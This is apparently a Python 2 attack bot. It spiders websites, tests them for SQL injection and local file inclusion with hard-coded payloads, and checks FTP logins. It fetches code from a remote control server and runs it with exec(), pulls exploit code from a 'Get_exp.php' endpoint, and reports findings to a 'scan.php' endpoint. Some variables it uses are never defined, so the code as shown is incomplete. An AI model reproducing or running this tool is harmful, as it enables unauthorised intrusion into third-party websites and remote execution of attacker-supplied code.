# coding=utf-8
from socket import *
from subprocess import Popen, PIPE
from platform import system
from ftplib import FTP
import threading,time,Queue
import re,sys,hashlib,marshal,zlib
import urllib,urllib2,cookielib,httplib,HTMLParser

class fuck:	
	def what_system(self):
		return system()
	def pinger(self,ip):
		if system()=='Linux':
			p=Popen(['ping','-c 2',ip],stdout=PIPE)
			m = re.search('ttl', p.stdout.read())
			if m:
				return ip
		if system()=='Windows':
			p=Popen('ping %s -n 2'%ip,stdout=PIPE)
			m = re.search('TTL', p.stdout.read())
			if m:
				return ip
	def localip(self):
		if system()=='Linux':
			p=Popen(['ifconfig'],stdout=PIPE)
			m = self.find('addr:(\d+\.\d+\.\d+\.\d+)', p.stdout.read())
			if m:
				return m[0]
		if system()=='Windows':
			p=Popen('arp -a',stdout=PIPE)
			m = self.find(': (\d+\.\d+\.\d+\.\d+)', p.stdout.read())
			if m:
				return m[0]
	def report(self,type,info):
		info_str=urllib.quote(info)
		url='%s?id=%s&type=%s&info=%s'%(report_url,report_id,type,info_str)
		try:
			return urllib.urlopen(url)
		except:
			return False
	def find(self,r,t):
		try:
			return re.findall(r,t)
		except:
			return False
	def urlget(self,url):
		try:
			return urllib.urlopen(url)
		except:
			return False
	def urlpost(self,url,value):
		data    = urllib.urlencode(value)
		headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' }
		res     = urllib2.Request(url,data,headers)
		try:
			ok  = urllib2.urlopen(res)
			return ok
		except:
			return False
	def custom_post(self,url,value,header):
		data    = value
		headers = header
		res     = urllib2.Request(url,data,headers)
		try:
			ok  = urllib2.urlopen(res)
			return ok
		except:
			return False
	def checkport(self,host,port):
		try:
			s=socket(AF_INET,SOCK_STREAM)
			s.settimeout(5)
			s.connect((host,int(port)))
			s.close()
			return True
		except:
			return False
	def ftpscan(self,host,info):
		i=info.split('|')
		user=i[0]
		passwd=i[1]
		try:
			ftp = FTP(host)
			ftp.login(user,passwd)
			ftp.quit()
			return 1
		except:
			return 0
	def urltoip(self,url):
		try:
			#result = getaddrinfo(url, None)
			return gethostbyname(url)#result[0][4][0]
		except:
			return False
	def webscan(self,url,path):
		try:
			connection = httplib.HTTPConnection(url)
			connection.request("GET",path)
			response = connection.getresponse()
			return response.status
		except:
			return False
	def get_md5(self,html):
		m=hashlib.md5()
		m.update(html)
		md5=m.hexdigest()
		return md5
	def get_head(self,url):
		if url.find('/')>-1:
			head_url=url.split('/')[0]
		else:
			head_url=url
		try:
			conn = httplib.HTTPConnection(head_url)
			conn.request("GET", "/")
			r=conn.getresponse()
			return r
		except:
			return False
	def thread(self,func,args,thr):
		'''[1] the func to run,[2] the func's args,[3] the thread nums'''
		q = Queue.Queue()
		t = []
		def start(q):
			while not q.empty():
				func(q.get())
		for a in args:
			q.put(a)
		for i in range(int(thr)):
			tt = threading.Thread(target=start,args=(q,))
			t.append(tt)
		for i in range(int(thr)):
			t[i].start()
		for i in range(int(thr)):
			#t[i].join(timeout=10)
			t[i].join()

class MyParser(HTMLParser.HTMLParser):
	def __init__(self):
		HTMLParser.HTMLParser.__init__(self)
		self.urls = []
	def handle_starttag(self, tag, attrs):
		if tag == 'a':
			for name,value in attrs:
				if name == 'href':
					self.urls.append(value)
	def geturls(self):
		return self.urls
	def urls_0(self):
		self.urls = []
	def spider(self,url):
		try:
			urls=[]
			self.feed(urllib.urlopen(url).read())
			urls += self.geturls()
			self.urls_0()
			return urls
		except:
			return False
	def repair_1(self,url):
		urls_tmp=[]
		urls_tmp_0 = []
		for i in url:
			if i.find('?')>-1 or i.find('http://')<0 and i.find('mailto:')<0:
				urls_tmp.append(i)
		for ii in urls_tmp:
			if ii not in urls_tmp_3:
				urls_tmp_0.append(ii)
				urls_tmp_3.append(ii)
		return urls_tmp_0
	def repair_2(self,url):
		for i in url:
			if i.find('?')>0 and i not in urls_tmp_1 or i.find('&')>0:
				urls_tmp_1.append(i)#'?'
		for ii in urls_tmp_1:
			if ii.split('?')[0] not in urls_tmp_2:
				urls_tmp_2.append(ii.split('?')[0])
				urls_tmp_ok.append(ii)
	def do_it(self,url):
		try:
			uuu_tmp=self.spider(url)#2
			self.repair_2(self.repair_1(uuu_tmp))
			print "urls_tmp_1:%s"%len(urls_tmp_1)
			uuu_tmp=[]
		except:
			pass
	def my_spider(self,url):
		uu_tmp_ok=[]
		urls = self.spider(("http://%s"%url))
		tmp_list=self.repair_1(urls)#1
		for u in tmp_list:
			u_tmp="http://%s/%s"%(url,u)
			#self.do_it(u_tmp)
			uu_tmp_ok.append(u_tmp)
		fuck.thread(self.do_it,uu_tmp_ok,10)
		print "#1 ok!"
		time.sleep(10)
		uu_tmp_ok=[]
		for x in urls_tmp_1:
			x_tmp="http://%s/%s"%(url,x)
			self.do_it(x_tmp)
			#uu_tmp_ok.append(x_tmp)
		#fuck.thread(self.do_it,uu_tmp_ok,10)
		print "#2 ok!"
class inject:
	def sql1(self,url):
		try:
			time1=fuck.get_md5(fuck.urlget(url).read())
			time.sleep(1)
			time2=fuck.get_md5(fuck.urlget(url).read())
			if time1==time2:
				return 1
			else:
				return 0
		except:
			return 0
	def sql2(self,url):
		try:
			poc=[' aNd 1=1|| aNd 1=2','\' aNd \'1\'=\'1||\' aNd \'1\'=\'2']
			for i in poc:
				poc1=i.split('||')[0]
				poc2=i.split('||')[1]
				htm1=fuck.get_md5(fuck.urlget(url+poc1).read())
				time.sleep(1)
				htm2=fuck.get_md5(fuck.urlget(url+poc2).read())
				if htm1==htm2:
					return 1
					break
				else:
					return 0
		except:
			return 0
	def lfi(self,url):
		try:
			poc='data:;base64,TlM3NzU0NTYxNDQ2NTc1'
			lfi_url_1=url.split('=')[0]
			poc_url=lfi_url_1+'='+poc
			htm1 = fuck.urlget(poc_url).read()
			ok = fuck.find('NS7754561446575',htm1)
			if len(ok)>0:
				fuck.report('lfi','%s Local File Inclusion'%poc_url)
				print '%s Local File Inclusion'%poc_url
		except:
			return 0
	def test_it(self,url):
		if self.sql1(inject_url)==1:
			if self.sql2(inject_url)==0:
				fuck.report('spider','%s Sql_inject'%inject_url)
				print '%s Sql_inject'%inject_url
			self.lfi(inject_url)
def url_spider(url):
	global urls_tmp_1
	global urls_tmp_2
	global urls_tmp_3
	global urls_tmp_ok
	urls_tmp_1 = []
	urls_tmp_2 = []
	urls_tmp_3 = []
	urls_tmp_ok = []
	my.my_spider(test_url)
	urls_tmp_1=[]
	return urls_tmp_ok
def exploit_it(cms):
	global exp_ver
	print "Try Exploit %s Now"%cms
	find_exp=fuck.urlget('http://'+_B+'/Get_exp.php?exp='+cms).read().decode('utf-8-sig')
	print "find_exp:%s"%find_exp
	if len(find_exp)>7:
		exp_tmp=find_exp.split("|exp|")
		for exp in exp_tmp:
			if len(exp)>0:
				exp_ver=exp
				exp_code=fuck.urlget('http://'+_B+'/Get_exp.php?x='+exp).read()
				exec(exp_code)
global report_url
global report_id
global test_url
try:
	fuck=fuck()
	my=MyParser()
	inject_test=inject()
	html=fuck.urlget('http://'+_B+'/Get.php?u='+_U).read()
	if len(html)>7:
		exec_code=html.split(':|:')[0]
		test_url=html.split(':|:')[1]
		report_id=html.split(':|:')[2]
		report_url='http://'+_B+'/scan.php'
		if test_url.find(':')<0:
			test_ip=fuck.urltoip(test_url)
		else:
			test_ip=fuck.urltoip(test_url.split(':')[0])
		exec(exec_code)
except Exception,e:
	print e	